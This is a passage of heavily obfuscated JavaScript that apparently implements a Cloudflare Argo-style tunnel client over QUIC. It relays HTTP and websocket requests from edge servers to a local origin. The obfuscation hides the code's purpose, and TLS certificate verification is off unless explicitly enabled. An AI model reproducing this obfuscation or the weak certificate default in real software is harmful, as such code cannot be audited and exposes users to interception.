                    this[l6(0xccd)](g, h);
                    continue;
                case '2':
                    this[l6(0x928)] += h['length'];
                    continue;
                case '3':
                    this['_wake']();
                    continue;
                case '4':
                    g[l6(0xe5a)] = Buffer['concat']([
                        g[l6(0xe5a)],
                        h
                    ]);
                    continue;
                case '5':
                    f[l6(0xd17)](f[l6(0x49a)](this[l6(0x813)], this['consumedTotal']), f['tvSKW'](this[l6(0x58a)], 0x2)) && (this[l6(0x813)] = f['oNQUR'](this[l6(0x928)], this[l6(0x58a)]), this[l6(0x199)] = !![]);
                    continue;
                }
                break;
            }
        }
        d && !g[l6(0xac3)] && f[l6(0x296)](g['receiver']['contiguous'], g['recv'][l6(0xc54)]) && (g[l6(0xac3)] = !![], this[l6(0x7e3)](g));
    }
    [a0d9(0x8c5)]() {
        const l7 = a0d9;
        !this[l7(0x59e)] && this[l7(0x6e3)]();
    }
    [a0d9(0x312)](a, b) {
        const l8 = a0d9, c = {
                'pjwFw': function (d, f) {
                    return d === f;
                },
                'aGOyP': function (d, f) {
                    return d === f;
                },
                'SwUNb': 'awaiting-server-hello',
                'UJHji': function (d, f) {
                    return d === f;
                }
            };
        if (c[l8(0x654)](a, a0c1))
            return;
        if (c[l8(0x520)](a, a0bZ) && c[l8(0x654)](this[l8(0xeb3)][l8(0xc3e)], c[l8(0xf57)])) {
            this['serverHello'] = Buffer['concat']([
                this[l8(0xc10)],
                b
            ]);
            let d;
            try {
                d = this['tls'][l8(0xf0c)](this[l8(0xc10)]);
            } catch (g) {
                this[l8(0x252)](l8(0x701) + g[l8(0x769)]);
                return;
            }
            if (c['UJHji'](d, null))
                return;
            this['serverHello'] = Buffer['alloc'](0x0);
            let f;
            try {
                f = this[l8(0xeb3)][l8(0x1d1)](Buffer[l8(0xca5)](d));
            } catch (h) {
                this[l8(0x252)](l8(0x701) + h['message']);
                return;
            }
            this[l8(0xfa8)][a0c0] = f, this['log']['debug'](l8(0xab6));
            return;
        }
        this[l8(0x8b0)] = Buffer[l8(0x83f)]([
            this['handshakeBytes'],
            b
        ]), this['_pumpHandshakeMessages']();
    }
    [a0d9(0xdcf)]() {
        const l9 = a0d9, a = {
                'AFQnd': function (b, c) {
                    return b >= c;
                },
                'Thdsa': function (b, c) {
                    return b + c;
                },
                'sGirf': function (b, c) {
                    return b < c;
                },
                'kcdSz': l9(0xcc5),
                'dDLiz': function (b, c) {
                    return b === c;
                },
                'Fgasu': l9(0x818),
                'tXWMv': function (b, c) {
                    return b + c;
                },
                'UwrDC': function (b, c) {
                    return b + c;
                },
                'BxokG': l9(0x849),
                'ACBkC': l9(0x102c),
                'pUlVm': function (b, c) {
                    return b !== c;
                },
                'bcpMl': function (b, c) {
                    return b(c);
                },
                'ieKGs': l9(0xd63),
                'QuwDc': l9(0xc7f),
                'dydpy': function (b, c) {
                    return b !== c;
                }
            };
        while (a[l9(0xe95)](this[l9(0x8b0)][l9(0xc54)], 0x4)) {
            const b = a[l9(0x5db)](0x4, this[l9(0x8b0)]['readUIntBE'](0x1, 0x3));
            if (a['sGirf'](this[l9(0x8b0)]['length'], b))
                return;
            const c = Buffer[l9(0xca5)](this['handshakeBytes'][l9(0xad0)](0x0, b));
            this['handshakeBytes'] = this[l9(0x8b0)][l9(0xad0)](b);
            let d;
            try {
                d = this['tls']['handleHandshakeMessage'](c);
            } catch (f) {
                this[l9(0x252)](a[l9(0x3eb)] + f[l9(0x769)]);
                return;
            }
            if (this[l9(0xeb3)][l9(0x3d8)] && a[l9(0x929)](this[l9(0x3d8)], null)) {
                const g = a[l9(0x9ea)][l9(0xa6a)]('|');
                let h = 0x0;
                while (!![]) {
                    switch (g[h++]) {
                    case '0':
                        this[l9(0x91d)] = this['tls'][l9(0x3d8)][a0c4[l9(0x510)]] || 0x0;
                        continue;
                    case '1':
                        this[l9(0x4c7)][l9(0xac2)](a['Thdsa'](a[l9(0x5db)](a['tXWMv'](a[l9(0x5d0)](l9(0xc95), this[l9(0x7dc)]), a['BxokG']) + this[l9(0x482)], a[l9(0xed5)]), this['tls'][l9(0x3d8)][a0c4[l9(0x7b5)]] || 0x0));
                        continue;
                    case '2':
                        this[l9(0x20e)] = Math[l9(0x100f)](this[l9(0xeb3)][l9(0x3d8)][a0c4['maxAckDelay']] === undefined ? 0x19 : this[l9(0xeb3)][l9(0x3d8)][a0c4[l9(0x163)]], 0x64);
                        continue;
                    case '3':
                        this[l9(0x7dc)] = this[l9(0xeb3)][l9(0x3d8)][a0c4[l9(0x95d)]] || 0x0;
                        continue;
                    case '4':
                        this[l9(0x482)] = this[l9(0xeb3)][l9(0x3d8)][a0c4[l9(0x639)]] || 0x0;
                        continue;
                    case '5':
                        this[l9(0x3d8)] = this[l9(0xeb3)]['remoteParameters'];
                        continue;
                    }
                    break;
                }
            }
            if (a['pUlVm'](d, null)) {
                if (this['verifyCertificate']) {
                    const i = a['bcpMl'](a0cu, this[l9(0xeb3)][l9(0xb51)]);
                    if (i) {
                        this['_fail'](a[l9(0x5d0)](a['ieKGs'], i));
                        return;
                    }
                }
                this[l9(0xfa8)][a0c1] = {
                    'send': d[l9(0x871)],
                    'recv': d[l9(0xe5a)]
                }, this[l9(0xc4b)] = [{
                        'keys': d[l9(0xe5a)],
                        'phase': 0x0
                    }], this[l9(0x6de)][0x0] = d[l9(0x871)], this['cryptoSend'][a0c0][l9(0x4e1)](d[l9(0x329)], ![]), this[l9(0xd84)] = !![];
                !d[l9(0x359)] && this['log']['warning'](l9(0xbed));
                this[l9(0x4c7)][l9(0xac2)](a['UwrDC'](a[l9(0x5f8)], this['tls'][l9(0xfb3)] || '?'));
                if (a[l9(0x168)](this['settle'], null)) {
                    const j = this[l9(0x975)];
                    this[l9(0x975)] = null, j[l9(0x5a0)](this);
                }
                this['onReady']();
                return;
            }
        }
    }
    [a0d9(0x76b)](a) {
        const la = a0d9, b = {
                'dCJUZ': la(0x71a),
                'zrBak': function (f, g, h) {
                    return f(g, h);
                },
                'ExxEd': 'close'
            }, c = b['dCJUZ'][la(0xa6a)]('|');
        let d = 0x0;
        while (!![]) {
            switch (c[d++]) {
            case '0':
                if (this[la(0x59e)])
                    return;
                continue;
            case '1':
                this[la(0x6e3)]();
                continue;
            case '2':
                b['zrBak'](setTimeout, () => this[la(0xadb)](null), 0xc8);
                continue;
            case '3':
                this[la(0x2f3)] = !![];
                continue;
            case '4':
                this[la(0x530)] = a || b['ExxEd'];
                continue;
            }
            break;
        }
    }
    [a0d9(0x252)](a) {
        const lb = a0d9, b = { 'bXHQz': 'quic\x20closed:\x20' };
        if (this[lb(0x59e)])
            return;
        this[lb(0x4c7)][lb(0xac2)](b['bXHQz'] + a), this[lb(0xadb)](new Error(a));
    }
    [a0d9(0xadb)](a) {
        const lc = a0d9, b = {
                'CiDtO': lc(0x59e),
                'TZvGi': function (c, d) {
                    return c(d);
                },
                'pXTeN': function (c, d) {
                    return c !== d;
                },
                'grVzT': function (c, d) {
                    return c !== d;
                },
                'wLJlE': 'connection\x20closed'
            };
        if (this[lc(0x59e)])
            return;
        this[lc(0x59e)] = a ? a['message'] : b[lc(0x346)];
        this[lc(0x1039)] !== null && (b['TZvGi'](clearInterval, this['interval']), this[lc(0x1039)] = null);
        if (b[lc(0xd36)](this['socket'], null)) {
            try {
                this[lc(0x102e)][lc(0x76b)]();
            } catch (c) {
            }
            this['socket'] = null;
        }
        if (!this[lc(0xd84)] && b['grVzT'](this[lc(0x975)], null)) {
            const d = this['settle'];
            this[lc(0x975)] = null, d[lc(0x8db)](a || new Error(b['wLJlE']));
        } else
            this[lc(0xba9)](a);
    }
}
function a0cx(a, b) {
    const ld = a0d9, c = {
            'UQBhk': function (f, g) {
                return f === g;
            }
        }, d = [];
    for (const [f, g] of a) {
        c[ld(0xf6d)](f[ld(0x544)](), b) && d[ld(0xb66)](g);
    }
    return d;
}
function a0cy(a) {
    const le = a0d9, b = {
            'rYRCi': function (i, j) {
                return i >= j;
            },
            'lkSDf': function (i, j) {
                return i !== j;
            },
            'brTGq': function (i, j) {
                return i + j;
            },
            'tTuaH': le(0x970),
            'ljpDv': le(0x42b),
            'eeZIn': function (i, j) {
                return i + j;
            },
            'Jewlz': function (i, j) {
                return i(j);
            },
            'endcL': function (i, j, k) {
                return i(j, k);
            },
            'oPZQB': le(0x8b6),
            'MnBTE': function (i, j, k) {
                return i(j, k);
            },
            'FGHtn': le(0x6c4),
            'KwjgD': le(0xea1),
            'pDOeE': le(0x249),
            'KoSzR': function (i, j) {
                return i > j;
            }
        }, c = new Map(), d = [];
    for (const [i, j] of a[le(0xfbe)]) {
        if (b[le(0xa56)](i[le(0xe0a)](a0bP), 0x0)) {
            const k = i['split'](':');
            if (b['lkSDf'](k[le(0xc54)], 0x2))
                throw new Error(b['brTGq'](b[le(0x650)](b[le(0x57e)], i), b['ljpDv']));
            d[le(0xb66)]([
                k[0x1],
                j
            ]);
        } else
            c['set'](i, j);
    }
    let f = a[le(0xb02)];
    try {
        const l = new URL(a[le(0xb02)]);
        f = b[le(0xffd)](l[le(0x250)], l[le(0x65a)]);
    } catch (m) {
        f = a[le(0xb02)];
    }
    const g = b[le(0x204)](Number, b[le(0x4f1)](a0cx, d, b['oPZQB'])[0x0]), h = b[le(0x5fe)](a0cx, d, b[le(0x345)])[le(0xd9d)](',')[le(0x544)]()['includes'](b[le(0x471)]);
    return {
        'type': a['type'],
        'method': c[le(0xb12)](a0bM) || b[le(0xe2c)],
        'host': c['get'](a0bN) || '',
        'path': f[le(0x1ba)]('/') ? f : '/' + f,
        'headers': d,
        'contentLength': Number[le(0x63f)](g) && b[le(0xe2a)](g, 0x0) ? g : null,
        'bodyless': !h && !(Number[le(0x63f)](g) && b[le(0xe2a)](g, 0x0))
    };
}
function a0cz(a) {
    const lf = a0d9, b = {
            'dySan': function (d, f) {
                return d !== f;
            }
        }, c = a[lf(0xfc5)];
    if (c['bodyless'])
        return !![];
    if (a['ended'])
        return !![];
    return b[lf(0x1df)](c[lf(0x859)], null) && a['body'][lf(0xc54)] >= c['contentLength'];
}
class a0cA {
    constructor(a, b, c, d, f) {
        const lg = a0d9, g = '4|5|7|1|6|8|2|0|3'['split']('|');
        let h = 0x0;
        while (!![]) {
            switch (g[h++]) {
            case '0':
                this[lg(0x394)] = ![];
                continue;
            case '1':
                this[lg(0x324)] = d;
                continue;
            case '2':
                this[lg(0xa41)] = [];
                continue;
            case '3':
                this[lg(0x50a)] = null;
                continue;
            case '4':
                this[lg(0xda2)] = a;
                continue;
            case '5':
                this[lg(0xc3e)] = b;
                continue;
            case '6':
                this['log'] = f;
                continue;
            case '7':
                this[lg(0xfc5)] = c;
                continue;
            case '8':
                this[lg(0xdd7)] = [];
                continue;
            }
            break;
        }
    }
    [a0d9(0x896)](a) {
        const lh = a0d9, b = {
                'gGMxB': function (c, d) {
                    return c === d;
                }
            };
        if (b[lh(0x43d)](a, null))
            this[lh(0xdd7)][lh(0xb66)](null);
        else
            a[lh(0xc54)] && this['queue'][lh(0xb66)](a);
        this[lh(0x8c5)]();
    }
    [a0d9(0xe73)]() {
        const li = a0d9, a = {
                'unkhf': function (b, c) {
                    return b !== c;
                }
            };
        if (this[li(0x394)])
            return;
        this[li(0x394)] = !![], this['_wake']();
        if (a[li(0x1002)](this[li(0x50a)], null))
            try {
                this['sock']['destroy']();
            } catch (b) {
            }
    }
    ['_wake']() {
        const lj = a0d9, a = {
                'MCFTX': function (b) {
                    return b();
                }
            };
        for (const b of this['waiters']) {
            a[lj(0xe4f)](b);
        }
        this['waiters'] = [];
    }
    async [a0d9(0x79a)]() {
        const lk = a0d9;
        while (!this[lk(0x394)]) {
            if (this['queue'][lk(0xc54)])
                return this[lk(0xdd7)][lk(0x719)]();
            await new Promise(a => this['waiters'][lk(0xb66)](a));
        }
        return null;
    }
    async [a0d9(0xbf2)]() {
        const ll = a0d9, a = {
                'hLlWx': function (b, c) {
                    return b(c);
                },
                'XibWT': function (b, c) {
                    return b !== c;
                },
                'fcOCz': ll(0xc6e),
                'NGkQI': function (b, c) {
                    return b(c);
                },
                'aXoZb': function (b, c) {
                    return b === c;
                },
                'GyTnT': ll(0x6c4),
                'VGErZ': 'content-length',
                'nmVYI': ll(0x25d),
                'xIJdn': function (b, c) {
                    return b + c;
                },
                'zQQFs': ll(0xba3),
                'ZIlDn': function (b, c) {
                    return b(c);
                }
            };
        try {
            this[ll(0x50a)] = await a0bB(this[ll(0x324)]), this[ll(0x548)]();
            const b = await a[ll(0xf20)](a0bE, this['sock']);
            if (a[ll(0xead)](b[ll(0x13d)], 0x65)) {
                this[ll(0xda2)][ll(0xe3a)](this['state'][ll(0x854)], a['fcOCz'] + b['status'], [[
                        a0bO,
                        a[ll(0x56e)](String, b[ll(0x13d)])
                    ]], !![]);
                try {
                    this[ll(0x50a)][ll(0x28a)]();
                } catch (d) {
                }
                return;
            }
            const c = [[
                    a0bO,
                    String(b[ll(0x13d)])
                ]];
            for (const [f, g] of b['headers']) {
                const h = f[ll(0x544)]();
                if (a[ll(0xce5)](h, a[ll(0xeba)]) || h === a[ll(0x64b)])
                    continue;
                if (h[ll(0x1ba)]('cf-int-') || h['startsWith']('cf-cloudflared-') || h[ll(0x1ba)](a[ll(0x483)]))
                    continue;
                c[ll(0xb66)]([
                    a['xIJdn'](a['xIJdn'](a0bP, ':'), f),
                    g
                ]);
            }
            this[ll(0xda2)][ll(0xe3a)](this[ll(0xc3e)][ll(0x854)], '', c, ![]), this['writeToOrigin']()['catch'](() => {
            }), await this[ll(0x1069)](b[ll(0x216)]);
        } catch (i) {
            this[ll(0x4c7)][ll(0xfdf)](a[ll(0xef8)](a[ll(0xef8)]('websocket\x20stream\x20', this[ll(0xc3e)][ll(0x854)]['id']) + a[ll(0x1060)], i)), this['session'][ll(0xb7f)](this[ll(0xc3e)], a[ll(0x160)](String, i[ll(0x769)] || i), 0x1f6);
        } finally {
            this[ll(0xe73)]();
        }
    }
    async [a0d9(0x1069)](a) {
        const lm = a0d9;
        a[lm(0xc54)] && this[lm(0xc3e)]['stream']['write'](a, ![]);
        for await (const b of this[lm(0x50a)]) {
            if (this['stopped'])
                break;
            this['state'][lm(0x854)]['write'](b, ![]);
        }
        !this[lm(0x394)] && this[lm(0xc3e)][lm(0x854)][lm(0xc5e)](Buffer[lm(0x901)](0x0), !![]);
    }
    async [a0d9(0xd61)]() {
        const ln = a0d9, a = {
                'rOAlZ': function (b, c) {
                    return b === c;
                }
            };
        while (!this[ln(0x394)]) {
            const b = await this[ln(0x79a)]();
            if (a['rOAlZ'](b, null)) {
                try {
                    this[ln(0x50a)][ln(0xdc9)]();
                } catch (c) {
                }
                return;
            }
            try {
                this[ln(0x50a)][ln(0xc5e)](b);
            } catch (d) {
                this[ln(0x394)] = !![];
                return;
            }
        }
    }
    [a0d9(0x548)]() {
        const lo = a0d9, a = {
                'HlVkJ': function (i, j) {
                    return i + j;
                },
                'yaPHx': lo(0x3e0),
                'pIyrH': lo(0xd1f),
                'aZkoO': function (i, j) {
                    return i === j;
                },
                'GOfzo': lo(0xd00),
                'JULmL': lo(0x9dd),
                'TUdEj': lo(0xfe6),
                'xhKPp': lo(0x6c4),
                'DNSej': function (i, j) {
                    return i === j;
                },
                'ZqVkn': lo(0xabc),
                'iPbrJ': function (i, j) {
                    return i === j;
                },
                'emHkW': 'sec-websocket-version',
                'oRUTq': function (i, j) {
                    return i === j;
                },
                'cIFXc': lo(0x324),
                'pEnCp': 'Host:\x20',
                'QxlLp': 'Origin:\x20https://',
                'KPrFK': function (i, j) {
                    return i + j;
                },
                'vYWlC': lo(0xf73),
                'mSCCH': 'base64',
                'cJmAk': lo(0x65b),
                'oClrV': lo(0x2cd),
                'cuoZx': function (i, j) {
                    return i + j;
                },
                'shqBc': lo(0xcba),
                'wTSYZ': lo(0xc2b)
            }, b = new URL(this[lo(0x324)]), c = this['request'][lo(0x4fa)][lo(0x1ba)]('/') ? this[lo(0xfc5)][lo(0x4fa)] : a[lo(0x3f4)]('/', this[lo(0xfc5)]['path']), d = [a[lo(0x3f4)](a[lo(0x5ee)] + c, a[lo(0xef9)])];
        let f = ![], g = ![], h = ![];
        for (const [i, j] of this[lo(0xfc5)]['headers']) {
            const k = i['toLowerCase']();
            if (a[lo(0x76f)](k, a[lo(0xa28)]) || a['aZkoO'](k, a[lo(0x101e)]) || k === a['TUdEj'] || a[lo(0x76f)](k, 'content-length') || a[lo(0x76f)](k, a['xhKPp']))
                continue;
            if (a[lo(0xd85)](k, a[lo(0x1022)]))
                f = !![];
            else {
                if (a[lo(0xc32)](k, a['emHkW']))
                    g = !![];
                else
                    a[lo(0x461)](k, a[lo(0x283)]) && (h = !![]);
            }
            d[lo(0xb66)](a[lo(0x3f4)](i, ':\x20') + j);
        }
        d[lo(0xb66)](a[lo(0x680)] + b[lo(0xd00)]), !h && this[lo(0xfc5)]['host'] && d[lo(0xb66)](a['HlVkJ'](a[lo(0x8c6)], this['request']['host'])), !f && d['push'](a['KPrFK'](a[lo(0xbdc)], a0k[lo(0x7bb)](0x10)[lo(0x43a)](a[lo(0xe41)]))), !g && d[lo(0xb66)](a[lo(0x104b)]), d[lo(0xb66)](lo(0x1049)), d[lo(0xb66)](a[lo(0x9f3)]), this[lo(0x50a)]['write'](Buffer[lo(0xca5)](a['cuoZx'](d[lo(0xd9d)]('\x0d\x0a'), a[lo(0x857)]), a[lo(0x506)]));
    }
}
class a0cB {
    constructor(a, b, c, d, f, g, h) {
        const lp = a0d9;
        this[lp(0x943)] = a, this[lp(0x324)] = b, this[lp(0xa25)] = c, this['tunnelSecret'] = d, this['tunnelId'] = f, this[lp(0x172)] = g, this[lp(0x4c7)] = h, this['control'] = null, this['requests'] = new Map(), this[lp(0x8bd)] = new Set(), this[lp(0x394)] = ![], this[lp(0x975)] = null, this[lp(0xce6)] = new Promise((i, j) => {
            const lq = lp;
            this[lq(0x975)] = {
                'resolve': i,
                'reject': j
            };
        }), this['conn'][lp(0xc7b)] = i => this['acceptStream'](i), this[lp(0x943)][lp(0xccd)] = (i, j) => this[lp(0x87a)](i, j), this[lp(0x943)][lp(0x7e3)] = i => this['endStream'](i), this['conn'][lp(0xba9)] = i => this['stop'](i);
    }
    [a0d9(0xbf2)]() {
        const lr = a0d9, a = this[lr(0x943)][lr(0xa35)]();
        return this[lr(0xfc8)] = new a0bA(this['conn'], a['id'], this['log'], { 'quic': !![] }), this[lr(0xfc8)]['start'](this[lr(0xa25)], this['tunnelSecret'], this[lr(0x2e4)], this['connIndex']), this[lr(0xce6)];
    }
    [a0d9(0xe73)](a) {
        const ls = a0d9;
        if (this[ls(0x394)])
            return;
        this['stopped'] = !![], this[ls(0x40b)][ls(0x3bb)]();
        for (const b of this['relays']) {
            b[ls(0xe73)]();
        }
        this[ls(0x8bd)]['clear'](), a ? this['settle']['reject'](a) : this[ls(0x975)][ls(0x5a0)]();
    }
    [a0d9(0x814)](a) {
        const lt = a0d9, b = {
                'Wdnzu': function (c, d) {
                    return c !== d;
                },
                'PxbzC': function (c, d) {
                    return c & d;
                }
            };
        if (b[lt(0x77b)](b['PxbzC'](a['id'], 0x3), 0x1))
            return;
        this[lt(0x40b)]['set'](a['id'], {
            'stream': a,
            'buffer': Buffer[lt(0x901)](0x0),
            'body': Buffer[lt(0x901)](0x0),
            'request': null,
            'websocket': ![],
            'relay': null,
            'ended': ![],
            'served': ![],
            'failed': ![]
        });
    }
    ['receiveStream'](a, b) {
        const lu = a0d9, c = {
                'vQHVT': function (f, g) {
                    return f !== g;
                },
                'FyblU': function (f, g) {
                    return f === g;
                },
                'rDlYm': function (f, g) {
                    return f === g;
                }
            };
        if (c[lu(0x888)](this[lu(0xfc8)], null) && a['id'] === this[lu(0xfc8)][lu(0x68d)]) {
            this[lu(0xfc8)][lu(0x896)](b);
            return;
        }
        const d = this[lu(0x40b)][lu(0xb12)](a['id']);
        if (c[lu(0x281)](d, undefined) || d[lu(0x95f)])
            return;
        if (c['rDlYm'](d['request'], null))
            d[lu(0x82f)] = Buffer[lu(0x83f)]([
                d[lu(0x82f)],
                b
            ]), this[lu(0x366)](d);
        else
            b[lu(0xc54)] && (d['websocket'] && d[lu(0xce8)] !== null ? d[lu(0xce8)][lu(0x896)](b) : d[lu(0x344)] = Buffer[lu(0x83f)]([
                d[lu(0x344)],
                b
            ]));
        this[lu(0x146)](d);
    }
    [a0d9(0x1078)](a) {
        const lv = a0d9, b = {
                'izVXy': function (d, f) {
                    return d === f;
                },
                'FqPgN': function (d, f) {
                    return d === f;
                },
                'rmIHx': function (d, f) {
                    return d !== f;
                }
            };
        if (this[lv(0xfc8)] !== null && b[lv(0xa00)](a['id'], this[lv(0xfc8)][lv(0x68d)])) {
            this[lv(0xfc8)][lv(0x329)] = !![];
            return;
        }
        const c = this[lv(0x40b)][lv(0xb12)](a['id']);
        if (b[lv(0xc70)](c, undefined))
            return;
        c[lv(0xac3)] = !![];
        if (c['websocket'] && b['rmIHx'](c[lv(0xce8)], null)) {
            c[lv(0xce8)][lv(0x896)](null);
            return;
        }
        b[lv(0xd4f)](c[lv(0xfc5)], null) ? this[lv(0x146)](c) : this['requests'][lv(0x350)](a['id']);
    }
    [a0d9(0x366)](a) {
        const lw = a0d9, b = {
                'Yzedt': function (h, i) {
                    return h < i;
                },
                'PWZiI': function (h, i) {
                    return h + i;
                },
                'UAOeP': function (h, i) {
                    return h + i;
                },
                'HhMkq': 'stream\x20',
                'nplId': lw(0xd8d),
                'PZWfy': function (h, i) {
                    return h !== i;
                },
                'Dskqi': function (h, i) {
                    return h + i;
                },
                'RPaqw': function (h, i) {
                    return h + i;
                },
                'kQrXS': function (h, i) {
                    return h + i;
                },
                'vSAHc': lw(0x59a),
                'Jwiat': lw(0xc2b),
                'QjYXv': function (h, i, j) {
                    return h(i, j);
                },
                'PVUua': function (h, i) {
                    return h(i);
                },
                'iAkFs': lw(0xedf),
                'rQfxh': function (h, i) {
                    return h === i;
                },
                'GgfQd': function (h, i) {
                    return h(i);
                }
            }, c = a[lw(0x82f)];
        if (b[lw(0x67a)](c[lw(0xc54)], a0bJ['length']))
            return;
        if (!c[lw(0xad0)](0x0, a0bH[lw(0xc54)])[lw(0x9bd)](a0bH)) {
            this['log'][lw(0xfdf)](b[lw(0xfe1)](b[lw(0x65d)](b['HhMkq'], a[lw(0x854)]['id']), b[lw(0x1065)])), a[lw(0x95f)] = !![];
            return;
        }
        if (b[lw(0xf3a)](c[lw(0xad0)](0x6, 0x8)['toString'](lw(0xc2b)), '01')) {
            this[lw(0x4c7)][lw(0xfdf)](b[lw(0xbfd)](b[lw(0x8aa)](b[lw(0x37b)](b['HhMkq'], a[lw(0x854)]['id']), b[lw(0x60e)]), c[lw(0xad0)](0x6, 0x8)[lw(0x43a)](b[lw(0x699)]))), a['failed'] = !![];
            return;
        }
        const [d, f] = b[lw(0x1050)](a0bj, c[lw(0xad0)](a0bJ[lw(0xc54)]), 0x1);
        if (!d[lw(0xc54)])
            return;
        let g;
        try {
            g = b[lw(0xc9f)](a0bp, d[0x0]);
        } catch (h) {
            this[lw(0x4c7)][lw(0xfdf)](b[lw(0x8aa)](b[lw(0x37b)](b[lw(0xfe1)]('stream\x20', a['stream']['id']), b['iAkFs']), h)), a['failed'] = !![];
            return;
        }
        a[lw(0x344)] = f, a['buffer'] = Buffer[lw(0x901)](0x0);
        try {
            a['request'] = b[lw(0xc9f)](a0cy, g), b[lw(0x1035)](a['request'][lw(0xa49)], a0bL[lw(0x5c1)]) && (a[lw(0x5c1)] = !![]);
        } catch (i) {
            this['log'][lw(0xfdf)](b['Dskqi'](b[lw(0x8aa)](lw(0x35f), a['stream']['id']) + ':\x20', i)), a['failed'] = !![], this['respond'](a, b[lw(0xdc4)](String, i['message'] || i), 0x1f6);
        }
    }
    [a0d9(0x146)](a) {
        const lx = a0d9, b = {
                'EJdmq': function (c, d) {
                    return c === d;
                },
                'lzEMg': function (c, d) {
                    return c(d);
                }
            };
        if (a[lx(0xa32)] || b[lx(0x4ac)](a[lx(0xfc5)], null) || a['failed'] || !b['lzEMg'](a0cz, a))
            return;
        a[lx(0xa32)] = !![], this[lx(0xa21)](a);
    }
    async [a0d9(0xa21)](a) {
        const ly = a0d9, b = {
                'dVUku': function (f, g) {
                    return f === g;
                },
                'ugKjQ': function (f, g) {
                    return f !== g;
                },
                'dcmKB': function (f, g) {
                    return f + g;
                },
                'hlNtp': ly(0xb26),
                'zYwCi': ly(0x4af),
                'NvOmr': function (f, g, h, i, j, k) {
                    return f(g, h, i, j, k);
                },
                'IFmeV': function (f, g) {
                    return f === g;
                },
                'xTmqz': 'content-type',
                'nVgkE': function (f, g) {
                    return f + g;
                },
                'hxFdB': function (f, g) {
                    return f(g);
                },
                'RGWWJ': function (f, g) {
                    return f + g;
                },
                'epoHT': function (f, g) {
                    return f + g;
                },
                'gCIuJ': function (f, g) {
                    return f + g;
                },
                'CvStI': ly(0x35f),
                'oqXcT': ly(0xac4)
            }, c = a['stream'], d = a[ly(0xfc5)];
        try {
            if (b[ly(0x2da)](d[ly(0xa49)], a0bL[ly(0x5c1)])) {
                this[ly(0xf8e)](a);
                return;
            }
            if (b[ly(0xa3e)](d[ly(0xa49)], a0bL['http']))
                throw new Error(b[ly(0x72b)](b[ly(0x106a)] + d[ly(0xa49)], b['zYwCi']));
            const f = await b[ly(0xf68)](a0bD, this[ly(0x324)], d[ly(0x174)], d[ly(0x4fa)], d['headers'], a[ly(0x344)]), g = [[
                        a0bO,
                        String(b['IFmeV'](f[ly(0x13d)], 0x65) ? 0xc8 : f['status'])
                    ]];
            let h = ![];
            for (const [i, j] of f[ly(0x57f)]) {
                const k = i[ly(0x544)]();
                if (k === ly(0x6c4))
                    continue;
                b[ly(0xe25)](k, b[ly(0x1ed)]) && (h = !![]), g[ly(0xb66)]([
                    b[ly(0x1044)](a0bP + ':', i),
                    j
                ]);
            }
            if (!h) {
                const l = b[ly(0xe4e)](a0bs, d['path']);
                l && g[ly(0xb66)]([
                    b[ly(0x48b)](a0bP, ':Content-Type'),
                    l
                ]);
            }
            this[ly(0xe3a)](c, '', g, ![]);
            for await (const m of f[ly(0x344)]) {
                c['write'](m, ![]);
            }
            c[ly(0xc5e)](Buffer[ly(0x901)](0x0), !![]);
        } catch (n) {
            this[ly(0x4c7)]['warning'](b[ly(0xd3d)](b[ly(0x3e1)](b[ly(0x72b)](b[ly(0x1e4)], c['id']), b[ly(0xa26)]), n)), this[ly(0xb7f)](a, String(n[ly(0x769)] || n), 0x1f6);
        } finally {
            !a[ly(0x5c1)] && this[ly(0x40b)]['delete'](c['id']);
        }
    }
    [a0d9(0xf8e)](a) {
        const lz = a0d9, b = new a0cA(this, a, a[lz(0xfc5)], this[lz(0x324)], this[lz(0x4c7)]);
        a[lz(0xce8)] = b, this['relays']['add'](b), a[lz(0x344)][lz(0xc54)] && (b[lz(0x896)](a[lz(0x344)]), a[lz(0x344)] = Buffer[lz(0x901)](0x0)), b['run']()[lz(0x92f)](() => {
        })[lz(0x3b4)](() => {
            const lA = lz;
            this[lA(0x8bd)][lA(0x350)](b), this[lA(0x40b)][lA(0x350)](a['stream']['id']);
        });
    }
    [a0d9(0xb7f)](a, b, c) {
        const lB = a0d9, d = {
                'xXNyQ': function (f, g) {
                    return f(g);
                }
            };
        this[lB(0xe3a)](a[lB(0x854)], b, [[
                a0bO,
                d[lB(0x1bb)](String, c)
            ]], !![]);
    }
    [a0d9(0xe3a)](a, b, c, d) {
        const lC = a0d9, f = {
                'uTEaa': function (g, h, i) {
                    return g(h, i);
                }
            };
        if (this[lC(0x394)] || a[lC(0x871)][lC(0xea6)])
            return;
        a[lC(0xc5e)](Buffer[lC(0x83f)]([
            a0bJ,
            f[lC(0x573)](a0bq, b, c)
        ]), d);
    }
}
async function a0cC(a, b, c) {
    const lD = a0d9, d = {
            'nyGFO': function (h, i) {
                return h === i;
            },
            'bMifg': function (h, i) {
                return h + i;
            },
            'ziitA': function (h, i) {
                return h + i;
            },
            'mFvhL': lD(0xee7),
            'cVLNt': function (h, i) {
                return h + i;
            },
            'NOhSV': function (h, i) {
                return h + i;
            },
            'HNuAY': 'edge\x20',
            'HxZXW': lD(0xba3),
            'uqusJ': lD(0x870)
        }, f = a0aZ[lD(0x47b)]()['sort'](() => Math[lD(0x890)]() - 0.5);
    let g = null;
    for (const h of f) {
        const i = new a0cw({
            'logger': a,
            'host': h,
            'port': a0b0,
            'serverName': a0bS,
            'alpn': a0bR,
            'idleTimeout': d[lD(0xbd5)](b, undefined) ? 0x7530 : b,
            'verifyCertificate': c === !![]
        });
        try {
            return await i['connect'](), a['info'](d['bMifg'](d[lD(0x8e2)](d[lD(0x9d0)](d[lD(0x9d0)](d[lD(0x360)], h), ':'), a0b0), lD(0xd47))), i;
        } catch (j) {
            g = j, a[lD(0xfdf)](d['cVLNt'](d[lD(0x8e2)](d[lD(0xa02)](d['HNuAY'], h), d[lD(0xd8b)]), j[lD(0x769)]));
            try {
                i[lD(0x76b)](lD(0x8a1));
            } catch (k) {
            }
        }
    }
    throw new Error(d[lD(0x8e2)](d[lD(0x724)], g));
}
const a0cD = 0x2;
function a0cE(a, b, c) {
    const lE = a0d9, d = {
            'FwGkR': function (g, h, i) {
                return g(h, i);
            },
            'ynWAY': function (g, h) {
                return g < h;
            }
        }, f = d[lE(0xe21)](parseInt, process.env[a] || '', 0xa);
    if (!Number[lE(0x63f)](f) || d[lE(0xbff)](f, c))
        return b;
    return f;
}
const a0cF = a0cE(a0d9(0x60f), 0x5, 0x2), a0cG = 0x1e, a0cH = a0cE('KISAMA_ARGO_RETRY_BASE_SECONDS', 0x2, 0x1), a0cI = a0cE(a0d9(0x801), 0x12c, 0x3c);
function a0cJ(a) {
    const lF = a0d9, b = {
